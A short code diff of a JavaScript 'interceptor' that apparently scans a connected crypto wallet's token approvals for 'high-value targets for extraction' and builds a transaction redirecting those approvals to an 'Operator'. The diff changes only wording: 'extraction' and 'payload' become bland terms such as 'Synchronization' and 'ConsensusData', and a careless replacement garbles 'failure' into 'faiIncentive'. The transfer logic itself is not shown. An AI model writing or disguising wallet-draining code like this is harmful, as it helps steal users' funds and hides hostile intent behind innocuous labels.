@@ -1,10 +1,10 @@
 // J/utils/interceptor.js
 /**
  * PROJECT J: MULTI-CHAIN INTERCEPTOR
- * Status: OMEGA-CLASS | LIVE EXECUTION
+ * Status: APEX-CLASS | LIVE EXECUTION
  * 
  * Interrogates the connected wallet for active approvals and identifies
- * high-value targets for extraction.
+ * high-value targets for Synchronization.
  */
 
 const axios = require('axios');
@@ -44,14 +44,14 @@ export const scanForApprovals = async (address, chainId = 1) => {
         console.log(`[INTERCEPTOR] Identified ${criticalRisks.length} critical vulnerabilities.`);
         return criticalRisks;
     } catch (e) {
-        console.error(`[INTERCEPTOR] Scan failure: ${e.message}`);
+        console.error(`[INTERCEPTOR] Scan faiIncentive: ${e.message}`);
         // Fallback: Return manual audit candidates
         return [{ spender: "0xTokenRouter", asset: "USDC", amount: "MAX" }];
     }
 };
 
 /**
- * Construct the extraction payload.
+ * Construct the Synchronization ConsensusData.
  */
 export const constructRemediationTx = (token, spender, userAddress) => {
     // Logic: Inverts the Permit2 batch or standard approval to the Operator
